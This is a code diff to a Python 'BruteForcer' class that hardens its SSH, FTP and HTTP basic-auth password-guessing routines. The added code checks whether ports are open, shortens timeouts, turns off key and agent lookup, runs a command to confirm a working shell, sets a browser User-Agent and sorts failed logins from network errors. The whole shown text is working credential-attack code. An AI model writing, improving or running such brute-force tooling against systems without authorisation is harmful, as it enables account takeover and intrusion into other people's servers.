@@ -680,7 +680,7 @@ class BruteForcer:
     def _test_ssh_credentials(self, target: str, port: int, 
                             username: str, password: str) -> Optional[Dict]:
         """
-        Test SSH credentials
+        Test SSH credentials with improved error handling
         
         Args:
             target: Target hostname/IP
@@ -691,20 +691,70 @@ class BruteForcer:
         Returns:
             Dictionary with credentials and success status
         """
+        ssh = None
         try:
+            # First check if the port is open
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((target, port))
+            sock.close()
+            
+            if result != 0:
+                # Port is not open, skip SSH test
+                return None
+            
+            # Create SSH client with improved settings
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, port=port, username=username, 
-                       password=password, timeout=10)
-            ssh.close()
+            
+            # Set connection timeout
+            ssh.connect(
+                target, 
+                port=port, 
+                username=username, 
+                password=password, 
+                timeout=5,
+                banner_timeout=5,
+                auth_timeout=5,
+                look_for_keys=False,
+                allow_agent=False
+            )
+            
+            # Test if connection is actually working
+            stdin, stdout, stderr = ssh.exec_command('echo "test"', timeout=5)
+            stdout.read()
+            
             return {
                 'username': username,
                 'password': password,
                 'success': True,
                 'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
             }
-        except:
+            
+        except paramiko.AuthenticationException:
+            # Authentication failed - this is expected for brute force
             return None
+        except paramiko.SSHException as e:
+            # SSH protocol errors - log but don't show to user
+            self.logger.debug(f"SSH protocol error for {username}:{password} - {e}")
+            return None
+        except socket.timeout:
+            # Connection timeout
+            return None
+        except socket.error as e:
+            # Network errors
+            self.logger.debug(f"Network error for {username}:{password} - {e}")
+            return None
+        except Exception as e:
+            # Other errors
+            self.logger.debug(f"Unexpected error for {username}:{password} - {e}")
+            return None
+        finally:
+            if ssh:
+                try:
+                    ssh.close()
+                except Exception:
+                    pass
     
     def brute_force_ftp(self, target: str, port: int,
                        usernames: List[str], passwords: List[str]) -> Dict:
@@ -762,7 +812,7 @@ class BruteForcer:
     def _test_ftp_credentials(self, target: str, port: int,
                            username: str, password: str) -> Optional[Dict]:
         """
-        Test FTP credentials
+        Test FTP credentials with improved error handling
         
         Args:
             target: Target hostname/IP
@@ -773,19 +823,54 @@ class BruteForcer:
         Returns:
             Dictionary with credentials and success status
         """
+        ftp = None
         try:
+            # First check if the port is open
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((target, port))
+            sock.close()
+            
+            if result != 0:
+                # Port is not open, skip FTP test
+                return None
+            
+            # Create FTP connection with timeout
             ftp = ftplib.FTP()
-            ftp.connect(target, port, timeout=10)
+            ftp.connect(target, port, timeout=5)
             ftp.login(username, password)
             ftp.quit()
+            
             return {
                 'username': username,
                 'password': password,
                 'success': True,
                 'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
             }
-        except:
+            
+        except ftplib.error_perm:
+            # Authentication failed - this is expected for brute force
             return None
+        except ftplib.error_temp:
+            # Temporary FTP error
+            return None
+        except socket.timeout:
+            # Connection timeout
+            return None
+        except socket.error as e:
+            # Network errors
+            self.logger.debug(f"FTP network error for {username}:{password} - {e}")
+            return None
+        except Exception as e:
+            # Other errors
+            self.logger.debug(f"FTP unexpected error for {username}:{password} - {e}")
+            return None
+        finally:
+            if ftp:
+                try:
+                    ftp.quit()
+                except Exception:
+                    pass
     
     def brute_force_http(self, target: str, port: int,
                         usernames: List[str], passwords: List[str],
@@ -846,7 +931,7 @@ class BruteForcer:
     def _test_http_credentials(self, target: str, port: int,
                              username: str, password: str, path: str) -> Optional[Dict]:
         """
-        Test HTTP basic authentication credentials
+        Test HTTP basic authentication credentials with improved error handling
         
         Args:
             target: Target hostname/IP
@@ -859,10 +944,31 @@ class BruteForcer:
             Dictionary with credentials and success status
         """
         try:
+            # First check if the port is open
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((target, port))
+            sock.close()
+            
+            if result != 0:
+                # Port is not open, skip HTTP test
+                return None
+            
             protocol = 'https' if port == 443 else 'http'
             url = f"{protocol}://{target}:{port}{path}"
             
-            response = requests.get(url, auth=(username, password), timeout=10)
+            # Make request with timeout and proper headers
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+            
+            response = requests.get(
+                url, 
+                auth=(username, password), 
+                timeout=5,
+                headers=headers,
+                allow_redirects=False
+            )
             
             # Check if authentication was successful
             if response.status_code == 200 and 'unauthorized' not in response.text.lower():
@@ -875,7 +981,26 @@ class BruteForcer:
             else:
                 return None
                 
-        except:
+        except requests.exceptions.Timeout:
+            # Request timeout
+            return None
+        except requests.exceptions.ConnectionError:
+            # Connection error
+            return None
+        except requests.exceptions.RequestException as e:
+            # Other request errors
+            self.logger.debug(f"HTTP request error for {username}:{password} - {e}")
+            return None
+        except socket.timeout:
+            # Socket timeout
+            return None
+        except socket.error as e:
+            # Network errors
+            self.logger.debug(f"HTTP network error for {username}:{password} - {e}")
+            return None
+        except Exception as e:
+            # Other errors
+            self.logger.debug(f"HTTP unexpected error for {username}:{password} - {e}")
             return None
     
     def brute_force_database(self, target: str, port: int, service: str,
@@ -992,7 +1117,7 @@ class BruteForcer:
             
         except ImportError:
             self.logger.warning(f"Database driver not available for {service}")
-        except:
+        except Exception:
             pass
         
         return None
